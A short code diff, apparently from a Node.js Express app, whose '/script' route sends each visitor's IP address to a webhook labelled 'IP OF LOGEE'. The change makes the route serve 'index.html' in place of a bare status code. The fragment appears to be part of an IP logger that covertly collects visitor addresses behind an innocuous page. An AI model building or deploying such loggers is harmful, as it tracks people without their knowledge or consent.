@@ -11,7 +11,7 @@ app.get('/script', (req, res) => {
  
   hook.send(`IP OF LOGEE: ${ip}`)
 
-  res.sendStatus(200)
+  res.sendFile("index.html")
 })
 
 app.listen(port, () => {
